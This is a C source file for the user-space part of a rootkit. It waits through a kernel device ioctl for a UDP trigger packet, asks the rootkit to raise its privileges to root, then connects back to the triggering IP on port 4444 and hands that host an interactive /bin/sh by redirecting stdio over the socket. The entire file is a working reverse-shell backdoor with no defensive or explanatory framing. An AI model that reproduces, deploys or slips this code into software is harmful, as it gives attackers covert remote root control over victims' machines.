#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "interface.h"

int main(void) {
    signal(SIGCHLD, SIG_IGN);

    printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
    fflush(stdout);

    int dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
    if (dev_fd < 0) {
        perror("[revshell] ERROR: Failed to open /dev/" rootkit_DEV_NAME);
        return 1;
    }

    printf("[revshell] Device /dev/%s opened successfully (fd=%d).\n", rootkit_DEV_NAME, dev_fd);
    printf("[revshell] Waiting in kernel space for UDP trigger (rootkit_IOCTL_WAIT_REMOTE)...\n");
    fflush(stdout);

    struct in_addr remote_ip;
    memset(&remote_ip, 0, sizeof(remote_ip));

    /* Wait in kernel space until UDP trigger packet arrives */
    if (ioctl(dev_fd, rootkit_IOCTL_WAIT_REMOTE, &remote_ip) < 0) {
        perror("[revshell] ERROR: ioctl rootkit_IOCTL_WAIT_REMOTE failed");
        close(dev_fd);
        return 1;
    }

    char ip_str[INET_ADDRSTRLEN];
    if (inet_ntop(AF_INET, &remote_ip, ip_str, sizeof(ip_str)) == NULL) {
        strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
    }

    printf("[revshell] TRIGGER RECEIVED! Remote IP: %s\n", ip_str);
    printf("[revshell] Requesting root privilege elevation (rootkit_IOCTL_ELEVATE)...\n");
    fflush(stdout);

    /* Elevate credentials to root (UID 0, GID 0) */
    if (ioctl(dev_fd, rootkit_IOCTL_ELEVATE, 0) < 0) {
        perror("[revshell] ERROR: ioctl rootkit_IOCTL_ELEVATE failed");
        close(dev_fd);
        return 1;
    }

    printf("[revshell] Credentials elevated successfully (UID=%d, EUID=%d).\n", getuid(), geteuid());
    printf("[revshell] Creating TCP socket...\n");
    fflush(stdout);

    close(dev_fd);

    /* Connect reverse TCP shell back to $REMOTE:4444 */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[revshell] ERROR: Failed to create TCP socket");
        return 1;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr = remote_ip;

    printf("[revshell] Connecting to %s:4444...\n", ip_str);
    fflush(stdout);

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("[revshell] ERROR: Failed to connect to remote IP");
        close(sock);
        return 1;
    }

    printf("[revshell] Connected to %s:4444! Redirecting stdio and spawning /bin/sh...\n", ip_str);
    fflush(stdout);

    /* Redirect stdin, stdout, stderr to networootkit socket */
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *argv[] = { "/bin/sh", "-i", NULL };
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", "TERM=xterm", NULL };
    execve("/bin/sh", argv, envp);

    /* If execve fails, print error */
    perror("[revshell] ERROR: execve failed");
    return 1;
}
